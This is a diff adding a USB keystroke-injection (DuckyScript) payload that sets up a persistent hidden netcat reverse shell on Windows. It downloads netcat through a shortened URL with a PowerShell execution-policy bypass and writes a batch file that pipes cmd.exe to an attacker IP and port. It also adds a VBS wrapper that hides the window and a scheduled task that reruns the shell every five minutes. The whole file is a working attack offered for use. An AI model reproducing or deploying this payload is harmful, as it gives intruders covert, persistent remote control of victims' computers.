@@ -1,0 +1,34 @@
+REM [Persistent netcat reverse shell that runs in the background every 5 minutes.]
+REM [replace [IP] with your listening IP]
+REM [replace [PORT] with a port of your choice]
+REM [opens command window]
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 500
+REM [downloads netcat and saves it as a.exe in the folder C:\System]
+STRING cd / & mkdir System & cd System & echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 1000
+REM [creates start.bat which triggers the reverse shell]
+STRING echo START /MIN a.exe [IP] [PORT] -e cmd.exe -d ^& exit > start.bat
+ENTER
+DELAY 100
+REM [creates three lines of commands in a script file telling the start.bat file to run in the background]
+STRING echo Set WshShell = CreateObject("WScript.Shell") > c.vbs
+ENTER
+DELAY 100
+STRING echo WshShell.Run chr(34) ^& "C:/System/start.bat" ^& Chr(34), 0 >> c.vbs
+ENTER
+DELAY 50
+STRING echo Set WshShell = Nothing >>> c.vbs
+ENTER
+DELAY 50
+REM [schedules the script file to run every 5 minutes (change the number 5 to a different time if you need)]
+STRING schtasks /create /tn TaskSystem /tr C:/System/c.vbs /sc minute /mo 5
+ENTER
+DELAY 75
+REM [runs start.bat and closes the command window]
+STRING start.bat & exit
+ENTER
